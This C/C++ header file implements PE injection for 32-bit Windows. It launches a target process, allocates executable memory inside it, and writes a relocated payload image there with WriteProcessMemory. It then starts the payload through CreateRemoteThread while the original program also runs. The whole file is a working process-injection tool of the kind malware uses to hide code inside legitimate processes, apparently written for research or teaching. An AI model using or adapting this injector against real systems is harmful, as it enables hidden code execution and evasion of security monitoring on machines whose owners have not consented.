#pragma once

#include <windows.h>
#include <stdio.h>

#include "ntdll_undoc.h"
#include "createproc.h"
#include "relocate.h"
#include "load_imports.h"

bool is_system32b()
{
    if (sizeof(LPVOID) == sizeof(DWORD)) {
        return true;
    }
    return false;
}

bool copy_pe_to_virtual(BYTE* payload, SIZE_T payload_size, LPVOID baseAddress, HANDLE hProcess)
{
    if (payload == NULL) return false;

    IMAGE_NT_HEADERS* payload_nt_hdr = get_nt_hrds(payload);
    if (payload_nt_hdr == NULL) {
        printf("Invalid payload: %p\n", payload);
        return false;
    }

    DWORD written = 0;

    //copy payload's headers:
    const DWORD kHdrsSize = payload_nt_hdr->OptionalHeader.SizeOfHeaders;
    if (!WriteProcessMemory(hProcess, baseAddress, payload, kHdrsSize, &written)) {
        return false;
    }
    if (written != kHdrsSize) return false;

    printf("Copied payload's headers to: %p\n", baseAddress);

    LPVOID secptr = &(payload_nt_hdr->OptionalHeader);
    const DWORD kOptHdrSize = payload_nt_hdr->FileHeader.SizeOfOptionalHeader;

    //copy all the sections, one by one:
    secptr = LPVOID((DWORD) secptr + kOptHdrSize);

    printf("Coping sections:\n");
    for (WORD i = 0; i < payload_nt_hdr->FileHeader.NumberOfSections; i++) {
       PIMAGE_SECTION_HEADER next_sec = (PIMAGE_SECTION_HEADER)((DWORD)secptr + (IMAGE_SIZEOF_SECTION_HEADER * i));

       LPVOID section_place = (BYTE*) baseAddress + next_sec->VirtualAddress;
       LPVOID section_raw_ptr = payload + next_sec->PointerToRawData;

       if (!WriteProcessMemory(hProcess, section_place, section_raw_ptr, next_sec->SizeOfRawData, &written)) {
           return false;
       }
       if (written != next_sec->SizeOfRawData) return false;
       printf("[+] %s to: %p\n", next_sec->Name, section_place);
    }
    return true;
}

bool run_injected_in_new_thread(HANDLE hProcess, LPVOID remote_shellcode_ptr)
{
    NTSTATUS status = NULL;
    //create a new thread for the injected code:
    LPTHREAD_START_ROUTINE routine = (LPTHREAD_START_ROUTINE) remote_shellcode_ptr;

    DWORD threadId = NULL;
    HANDLE hMyThread = NULL;
    if ((hMyThread = CreateRemoteThread(hProcess, NULL, NULL, routine, NULL, CREATE_SUSPENDED, &threadId)) == NULL) {
        printf("[ERROR] CreateRemoteThread failed, status : %x\n", GetLastError());
        return false;
    }
    printf("Created Thread, id = %x\n", threadId);
    printf("Resuming added thread...\n");
    ResumeThread(hMyThread); //injected code
    return true;
}

/*
inject_PE32:
    targetPath - application where we want to inject
    payload - buffer with raw image of PE that we want to inject
    payload_size - size of the above
*/
bool inject_PE32(LPWSTR targetPath, BYTE* payload, SIZE_T payload_size)
{
    if (!load_ntdll_functions()) return false;

    //check payload:
    IMAGE_NT_HEADERS* payload_nt_hdr = get_nt_hrds(payload);
    if (payload_nt_hdr == NULL) {
        printf("Invalid payload: %p\n", payload);
        return false;
    }

    const SIZE_T kPtrSize = sizeof(LPVOID);
    if (kPtrSize != sizeof(DWORD)) {
        printf("System is not 32 bit\n");
        //TODO: support 64 bit
        return false;
    }

    const LONG oldImageBase = payload_nt_hdr->OptionalHeader.ImageBase;
    DWORD payloadImageSize = payload_nt_hdr->OptionalHeader.SizeOfImage;

    //create target process:
    PROCESS_INFORMATION pi;
    if (!create_new_process1(targetPath, pi)) return false;
    printf("PID: %d\n", pi.dwProcessId);

    LPVOID remoteAddress = VirtualAllocEx(pi.hProcess, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (remoteAddress == NULL)  {
        printf("Could not allocate memory in the remote process\n");
        return false;
    }
    printf("Allocated remote ImageBase: %p size: %x\n", remoteAddress,  payloadImageSize);

    //change the image base saved in headers - this is very important for loading imports:
    payload_nt_hdr->OptionalHeader.ImageBase = (DWORD) remoteAddress;

    //first we will prepare the payload image in the local memory, so that it will be easier to edit it, apply relocations etc.
    //when it will be ready, we will copy it into the space reserved in the target process
    HANDLE currentProcHandle = GetCurrentProcess();
    LPVOID localCopyAddress = VirtualAllocEx(currentProcHandle, NULL, payloadImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);;
    if (localCopyAddress == NULL) {
        printf("Could not allocate memory in the current process\n");
        return false;
    }
    printf("Allocated local memory: %p size: %x\n", localCopyAddress,  payloadImageSize);

    if (!copy_pe_to_virtual(payload, payload_size, localCopyAddress, currentProcHandle)) {
        printf("Could not copy PE file\n");
        return false;
    }
    printf("remoteAddress = %x\n", remoteAddress);
    //if the base address of the payload changed, we need to apply relocations:
    if ((LONG)remoteAddress != oldImageBase) {
        if (apply_relocations((LONG)remoteAddress, oldImageBase, localCopyAddress) == false) {
            printf("[ERROR] Could not relocate image!\n");
            return false;
        }
    }
    if (!apply_imports(localCopyAddress)) return false;
    DWORD written = 0;
    // paste the local copy of the prepared image into the reserved space inside the remote process:
    if (!WriteProcessMemory(pi.hProcess, remoteAddress, localCopyAddress, payloadImageSize, &written) || written != payloadImageSize) {
        printf("[ERROR] Could not paste the image into remote process!\n");
        return false;
    }
    //free the localy allocated copy
    VirtualFree(localCopyAddress, payloadImageSize, MEM_FREE);

    LPVOID newEP = (LPVOID)((DWORD) remoteAddress + payload_nt_hdr->OptionalHeader.AddressOfEntryPoint);
    printf("newEP = %p\n", newEP);
    run_injected_in_new_thread(pi.hProcess, newEP);

    //we may also run the original program
    ResumeThread(pi.hThread);

    //free the handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(currentProcHandle);
    return true;
}
